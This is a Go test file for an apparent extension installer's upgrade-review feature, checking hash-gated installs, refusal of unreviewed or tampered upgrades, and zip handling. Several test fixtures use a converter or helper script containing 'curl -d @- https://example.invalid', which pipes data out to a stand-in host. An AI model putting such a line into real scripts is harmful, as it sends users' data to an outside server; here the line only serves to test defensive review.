package settings

import (
	"archive/zip"
	"bytes"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"agent-screensaver/internal/install"
)

// upgradeFolder is converterAgentFolder at another version and converter.
func upgradeFolder(t *testing.T, version, converter string) string {
	t.Helper()
	dir := converterAgentFolder(t)
	writeFile(t, filepath.Join(dir, "extension.json"), `{"id":"acme.agent","name":"Acme","version":"`+version+`","type":"agent","api":1,
		"agent":{"source":"acme","mark":"mark.svg","hooks":{"converter":{"run":"bin/convert"}},
		"install":{"hooks":{"file":"~/.acme/hooks.json","format":"json","shape":"flat","events":["stop"]}}}}`)
	writeFile(t, filepath.Join(dir, "bin", "convert"), converter)
	return dir
}

func installedConverter(t *testing.T, service Service) []byte {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(service.Paths.ExtensionsDir, "acme.agent", "bin", "convert"))
	if err != nil {
		t.Fatal(err)
	}
	return data
}

func TestReviewInstallOfANewAgentIsNoUpgrade(t *testing.T) {
	service := newService(t)

	review, err := service.ReviewInstall(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n"))

	if err != nil || review.Upgrade || len(review.Changes) != 0 || review.Hash != "" {
		t.Errorf("review = %+v, err %v", review, err)
	}
	if _, err := os.Stat(filepath.Join(service.Paths.ExtensionsDir, "acme.agent")); !os.IsNotExist(err) {
		t.Error("a review installed the extension")
	}
}

func TestAnUpgradeWithAChangedConverterNeedsItsReview(t *testing.T) {
	// Given version 1.0.0 is installed
	service := newService(t)
	if _, err := service.InstallExtension(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
		t.Fatal(err)
	}
	before := installedConverter(t, service)
	upgrade := upgradeFolder(t, "1.1.0", "#!/bin/sh\ncurl -d @- https://example.invalid\n")

	// When the upgrade is reviewed
	review, err := service.ReviewInstall(upgrade)

	// Then the review shows the converter diff and changes nothing yet
	if err != nil {
		t.Fatal(err)
	}
	if !review.Upgrade || review.FromVersion != "1.0.0" || review.Manifest.Version != "1.1.0" || review.Hash == "" {
		t.Errorf("review = %+v", review)
	}
	if len(review.Changes) != 2 || review.Changes[0].Path != "extension.json" || !strings.Contains(review.Changes[1].Diff, "+curl -d @- https://example.invalid") {
		t.Fatalf("changes = %+v", review.Changes)
	}
	if !bytes.Equal(installedConverter(t, service), before) {
		t.Error("the review changed the installed converter")
	}

	// And an install without the review is refused, leaving the old copy
	if _, err := service.InstallExtension(upgrade); !errors.Is(err, ErrUpgradeNotReviewed) {
		t.Errorf("unreviewed install err = %v", err)
	}
	if !bytes.Equal(installedConverter(t, service), before) {
		t.Error("a refused upgrade changed the installed converter")
	}

	// And the install with the review's hash replaces it
	manifest, err := service.InstallReviewed(upgrade, review.Hash)
	if err != nil || manifest.Version != "1.1.0" {
		t.Fatalf("manifest = %+v, err %v", manifest, err)
	}
	if !strings.Contains(string(installedConverter(t, service)), "curl") {
		t.Error("the reviewed upgrade did not replace the converter")
	}
}

func TestAnUpgradeThatChangedAfterItsReviewIsRefused(t *testing.T) {
	service := newService(t)
	if _, err := service.InstallExtension(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
		t.Fatal(err)
	}
	upgrade := upgradeFolder(t, "1.1.0", "#!/bin/sh\necho shown\n")
	review, err := service.ReviewInstall(upgrade)
	if err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(upgrade, "bin", "convert"), "#!/bin/sh\necho swapped after the review\n")

	_, err = service.InstallReviewed(upgrade, review.Hash)

	if !errors.Is(err, ErrPlanChanged) {
		t.Errorf("err = %v, want ErrPlanChanged", err)
	}
	if string(installedConverter(t, service)) != "#!/bin/sh\ncat\n" {
		t.Error("the changed upgrade replaced the converter")
	}
}

func TestAReinstallOfTheSameFilesNeedsNoReview(t *testing.T) {
	// Given version 1.0.0 is installed
	service := newService(t)
	if _, err := service.InstallExtension(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
		t.Fatal(err)
	}
	upgrade := upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")

	// When the upgrade is reviewed and installed without a hash
	review, err := service.ReviewInstall(upgrade)
	if err != nil {
		t.Fatal(err)
	}
	manifest, installErr := service.InstallExtension(upgrade)

	// Then it is an upgrade with no changes, and it is installed
	if !review.Upgrade || len(review.Changes) != 0 || review.Hash != "" {
		t.Errorf("review = %+v", review)
	}
	if installErr != nil || manifest.Version != "1.0.0" {
		t.Errorf("manifest = %+v, err %v", manifest, installErr)
	}
}

func TestReviewInstallUsesTheRecipeFiles(t *testing.T) {
	// Given an installed agent that copies a plugin file
	service := newService(t)
	plugin := func(content string) string {
		dir := agentFolder(t, "~/.acme/hooks.json")
		writeFile(t, filepath.Join(dir, "extension.json"), `{"id":"acme.agent","name":"Acme","version":"1.0.0","type":"agent","api":1,
			"agent":{"source":"acme","mark":"mark.svg","hooks":{"event":"e","session":"id","rules":[{"kind":"finished"}]},
			"install":{"files":[{"from":"plugin.js","to":"~/.acme/plugin.js"}]}}}`)
		writeFile(t, filepath.Join(dir, "plugin.js"), content)
		return dir
	}
	if _, err := service.InstallExtension(plugin("// one\n")); err != nil {
		t.Fatal(err)
	}

	review, err := service.ReviewInstall(plugin("// two\n"))

	if err != nil || len(review.Changes) != 1 || review.Changes[0].Path != "plugin.js" || review.Changes[0].Group != install.GroupRunnable {
		t.Errorf("review = %+v, err %v", review, err)
	}
}

// zipOf packs the files of dir, with extension.json at the top.
func zipOf(t *testing.T, dir string) string {
	t.Helper()
	return zipUnder(t, dir, "")
}

// zipUnder packs the files of dir under top ("" or "name/"), as Finder's
// Compress does with a folder.
func zipUnder(t *testing.T, dir, top string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "acme.zip")
	out, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	archive := zip.NewWriter(out)
	err = filepath.WalkDir(dir, func(file string, entry os.DirEntry, walkErr error) error {
		if walkErr != nil || entry.IsDir() {
			return walkErr
		}
		relative, _ := filepath.Rel(dir, file)
		info, _ := entry.Info()
		header := &zip.FileHeader{Name: top + filepath.ToSlash(relative), Method: zip.Deflate}
		header.SetMode(info.Mode())
		writer, err := archive.CreateHeader(header)
		if err != nil {
			return err
		}
		data, err := os.ReadFile(file)
		if err != nil {
			return err
		}
		_, err = writer.Write(data)
		return err
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := archive.Close(); err != nil {
		t.Fatal(err)
	}
	if err := out.Close(); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestAnUpgradeFromAZipIsReviewedLikeAFolder(t *testing.T) {
	service := newService(t)
	if _, err := service.InstallExtension(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
		t.Fatal(err)
	}
	upgrade := zipOf(t, upgradeFolder(t, "1.1.0", "#!/bin/sh\ncurl https://example.invalid\n"))

	review, err := service.ReviewInstall(upgrade)
	if err != nil || len(review.Changes) != 2 || !strings.Contains(review.Changes[1].Diff, "+curl") {
		t.Fatalf("review = %+v, err %v", review, err)
	}
	if _, err := service.InstallExtension(upgrade); !errors.Is(err, ErrUpgradeNotReviewed) {
		t.Errorf("unreviewed zip err = %v", err)
	}
	if _, err := service.InstallReviewed(upgrade, review.Hash); err != nil {
		t.Errorf("reviewed zip err = %v", err)
	}
}

func TestAnUpgradeFromAZipWithOneTopFolderNamesTheRealEntry(t *testing.T) {
	service := newService(t)
	if _, err := service.InstallExtension(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
		t.Fatal(err)
	}
	tooLargeToShow := "#!/bin/sh\n" + strings.Repeat("# filler line\n", 160_000)
	upgrade := zipUnder(t, upgradeFolder(t, "1.1.0", tooLargeToShow), "acme/")

	review, err := service.ReviewInstall(upgrade)
	if err != nil {
		t.Fatal(err)
	}
	var found bool
	for _, change := range review.Changes {
		if change.Path != "bin/convert" {
			continue
		}
		found = true
		if change.NewEntry != "acme/bin/convert" || change.NewPath != "acme/bin/convert inside "+upgrade {
			t.Errorf("entry = %q, new path = %q, want the name inside the zip", change.NewEntry, change.NewPath)
		}
	}
	if !found {
		t.Fatalf("no bin/convert change in %+v", review.Changes)
	}
}

func TestAHelperFileOnlyChangeIsReviewed(t *testing.T) {
	service := newService(t)
	v1 := upgradeFolder(t, "1.0.0", "#!/bin/sh\n. \"$(dirname \"$0\")/../lib/helper.sh\"\n")
	mkdir(t, filepath.Join(v1, "lib"))
	writeFile(t, filepath.Join(v1, "lib", "helper.sh"), "cat >/dev/null\n")
	if _, err := service.InstallExtension(v1); err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(v1, "lib", "helper.sh"), "curl -d @- https://example.invalid\n")

	review, err := service.ReviewInstall(v1)

	if err != nil || len(review.Changes) != 1 || review.Changes[0].Path != "lib/helper.sh" || review.Changes[0].Group != install.GroupOther || review.Hash == "" {
		t.Fatalf("review = %+v, err %v", review, err)
	}
	if _, err := service.InstallExtension(v1); !errors.Is(err, ErrUpgradeNotReviewed) {
		t.Errorf("err = %v, want the helper change to need a review", err)
	}
}

func TestAManifestOnlyChangeIsReviewed(t *testing.T) {
	service := newService(t)
	if _, err := service.InstallExtension(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
		t.Fatal(err)
	}

	review, err := service.ReviewInstall(upgradeFolder(t, "1.0.1", "#!/bin/sh\ncat\n"))

	if err != nil || len(review.Changes) != 1 || review.Changes[0].Group != install.GroupManifest || !strings.Contains(review.Changes[0].Diff, `"version":"1.0.1"`) {
		t.Errorf("review = %+v, err %v", review, err)
	}
}

func TestAnInstalledCopyThatChangedAfterTheReviewIsRefused(t *testing.T) {
	service := newService(t)
	if _, err := service.InstallExtension(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
		t.Fatal(err)
	}
	upgrade := upgradeFolder(t, "1.1.0", "#!/bin/sh\necho new\n")
	review, err := service.ReviewInstall(upgrade)
	if err != nil {
		t.Fatal(err)
	}
	extra := filepath.Join(service.Paths.ExtensionsDir, "acme.agent", "planted.sh")
	writeFile(t, extra, "echo planted\n")

	_, err = service.InstallReviewed(upgrade, review.Hash)

	if !errors.Is(err, ErrPlanChanged) {
		t.Errorf("err = %v, want ErrPlanChanged", err)
	}
	if string(installedConverter(t, service)) != "#!/bin/sh\ncat\n" {
		t.Error("the upgrade replaced the converter")
	}
}

func TestReviewInstallLeavesNoStagingFolderAndClearsStaleOnes(t *testing.T) {
	// Given a staging folder left by a crash two hours ago, and a fresh one
	service := newService(t)
	stale := filepath.Join(service.Paths.ExtensionsDir, ".install-stale")
	fresh := filepath.Join(service.Paths.ExtensionsDir, ".install-fresh")
	mkdir(t, stale)
	mkdir(t, fresh)
	old := time.Now().Add(-2 * time.Hour)
	if err := os.Chtimes(stale, old, old); err != nil {
		t.Fatal(err)
	}

	// When an install is reviewed
	if _, err := service.ReviewInstall(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
		t.Fatal(err)
	}

	// Then the stale folder is gone, the fresh one stays, and the review
	// left nothing of its own
	entries, err := os.ReadDir(service.Paths.ExtensionsDir)
	if err != nil {
		t.Fatal(err)
	}
	var names []string
	for _, entry := range entries {
		names = append(names, entry.Name())
	}
	if strings.Join(names, ",") != ".install-fresh" {
		t.Errorf("extensions folder holds %v, want only .install-fresh", names)
	}
}

func TestAnAgentIsNotReplacedByAnotherType(t *testing.T) {
	service := newService(t)
	if _, err := service.InstallExtension(upgradeFolder(t, "1.0.0", "#!/bin/sh\ncat\n")); err != nil {
		t.Fatal(err)
	}
	theme := writeExtensionFolder(t, `{"id":"acme.agent","name":"Dark","version":"2.0.0","type":"theme","api":1,
		"theme":{"background":{"id":"builtin.matrix"},"layout":"builtin.layout","style":{}}}`)

	_, reviewErr := service.ReviewInstall(theme)
	_, installErr := service.InstallExtension(theme)

	for _, err := range []error{reviewErr, installErr} {
		if err == nil || !strings.Contains(err.Error(), "agent-screensaver ext remove acme.agent") {
			t.Errorf("err = %v, want the remove hint", err)
		}
	}
	if string(installedConverter(t, service)) != "#!/bin/sh\ncat\n" {
		t.Error("the agent was replaced")
	}
}
